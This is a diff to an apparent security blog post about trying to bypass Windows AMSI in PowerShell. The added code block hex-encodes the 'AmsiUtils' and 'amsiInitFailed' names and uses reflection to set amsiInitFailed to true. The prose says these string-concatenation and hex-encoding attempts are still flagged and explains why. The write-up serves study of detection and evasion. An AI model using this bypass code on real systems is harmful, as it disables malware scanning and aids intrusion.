@@ -109,13 +109,13 @@
 
 
              <h2 class="section-label">String Concatenation</h2>
-            <p>This concept is almost same as string reversing, but instead of reversing the string, we concatenate multiple strings to form the malicious stager.</p>
+            <p>This concept is almost same as string reversing, but instead of reversing the string, we dissect and concatenate multiple strings to form the stager script.</p>
 
             <div class="image-placeholder">
                 <img src="assets/images/string_concat.png" alt="String Concatenation">
             </div>
 
-            <p>As a expected, the concatenated string get flagged again because AMSI perform most of its analysis at runtime.</p>
+            <p>As expected, the concatenated string get flagged again because AMSI perform most of its analysis at runtime.</p>
 
             <div style="background-color: #1e1e1e; padding: 20px; border-radius: 8px; font-family: 'Consolas', 'Monaco', monospace; line-height: 1.5; color: #d4d4d4; border: 1px solid #3c3c3c; overflow-x: auto; margin: 20px 0;">
     <div><span style="color: #9cdcfe;">$s1</span> = <span style="color: #ce9178;">'System.Management.Automation.A'</span> + <span style="color: #ce9178;">'msi'</span> + <span style="color: #ce9178;">'Utils'</span></div>
@@ -129,11 +129,19 @@
              <h2 class="section-label">Hex Encoding</h2>
             <p>The hex encoding method flagged becuase hex-encoding the strings wasn't enough because the AMSI engine is now pattern-matching the conversion logic itself.</p>
 
+            <div style="background-color: #1e1e1e; padding: 20px; border-radius: 8px; font-family: 'Consolas', 'Monaco', monospace; line-height: 1.5; color: #d4d4d4; border: 1px solid #3c3c3c; overflow-x: auto; margin: 20px 0;">
+    <div><span style="color: #9cdcfe;">$bnbku</span> = [<span style="color: #4ec9b0;">char[]</span>](<span style="color: #b5cea8;">0x53</span>,<span style="color: #b5cea8;">0x79</span>,<span style="color: #b5cea8;">0x73</span>,<span style="color: #b5cea8;">0x74</span>,<span style="color: #b5cea8;">0x65</span>,<span style="color: #b5cea8;">0x6d</span>,<span style="color: #b5cea8;">0x2e</span>,<span style="color: #b5cea8;">0x4d</span>,<span style="color: #b5cea8;">0x61</span>,<span style="color: #b5cea8;">0x6e</span>,<span style="color: #b5cea8;">0x61</span>,<span style="color: #b5cea8;">0x67</span>,<span style="color: #b5cea8;">0x65</span>,<span style="color: #b5cea8;">0x6d</span>,<span style="color: #b5cea8;">0x65</span>,<span style="color: #b5cea8;">0x6e</span>,<span style="color: #b5cea8;">0x74</span>,<span style="color: #b5cea8;">0x2e</span>,<span style="color: #b5cea8;">0x41</span>,<span style="color: #b5cea8;">0x75</span>,<span style="color: #b5cea8;">0x74</span>,<span style="color: #b5cea8;">0x6f</span>,<span style="color: #b5cea8;">0x6d</span>,<span style="color: #b5cea8;">0x61</span>,<span style="color: #b5cea8;">0x74</span>,<span style="color: #b5cea8;">0x69</span>,<span style="color: #b5cea8;">0x6f</span>,<span style="color: #b5cea8;">0x6e</span>,<span style="color: #b5cea8;">0x2e</span>,<span style="color: #b5cea8;">0x41</span>,<span style="color: #b5cea8;">0x6d</span>,<span style="color: #b5cea8;">0x73</span>,<span style="color: #b5cea8;">0x69</span>,<span style="color: #b5cea8;">0x55</span>,<span style="color: #b5cea8;">0x74</span>,<span style="color: #b5cea8;">0x69</span>,<span style="color: #b5cea8;">0x6c</span>,<span style="color: #b5cea8;">0x73</span>) -join <span style="color: #ce9178;">''</span></div>
+    <div><span style="color: #9cdcfe;">$uaymf</span> = [<span style="color: #4ec9b0;">char[]</span>](<span style="color: #b5cea8;">0x61</span>,<span style="color: #b5cea8;">0x6d</span>,<span style="color: #b5cea8;">0x73</span>,<span style="color: #b5cea8;">0x69</span>,<span style="color: #b5cea8;">0x49</span>,<span style="color: #b5cea8;">0x6e</span>,<span style="color: #b5cea8;">0x69</span>,<span style="color: #b5cea8;">0x74</span>,<span style="color: #b5cea8;">0x46</span>,<span style="color: #b5cea8;">0x61</span>,<span style="color: #b5cea8;">0x69</span>,<span style="color: #b5cea8;">0x6c</span>,<span style="color: #b5cea8;">0x65</span>,<span style="color: #b5cea8;">0x64</span>) -join <span style="color: #ce9178;">''</span></div>
+    <br>
+    <div><span style="color: #9cdcfe;">$vdlqr</span> = [<span style="color: #4ec9b0;">Ref</span>].Assembly.GetType(<span style="color: #9cdcfe;">$bnbku</span>).GetField(<span style="color: #9cdcfe;">$uaymf</span>, <span style="color: #ce9178;">'NonPublic,Static'</span>)</div>
+    <div><span style="color: #9cdcfe;">$vdlqr</span>.SetValue(<span style="color: #569cd6;">$null</span>, <span style="color: #569cd6;">$true</span>)</div>
+</div>
+
              <div class="image-placeholder">
                 <img src="assets/images/hex_encoding.png" alt="Hex Encoding">
             </div>
 
-        <p>Even though we encode the "malicious strings" (AmsiUtils, amsiInitFailed), the engine looked at the context of the code. It saw a pattern of:</p>
+        <p>Even though we encode the so called "malicious strings" (AmsiUtils, amsiInitFailed), the engine looked at the context of the code. It saw a pattern of:</p>
 
                 <ul>
                 <li>Getting a reference to a non-public, static field.</li>
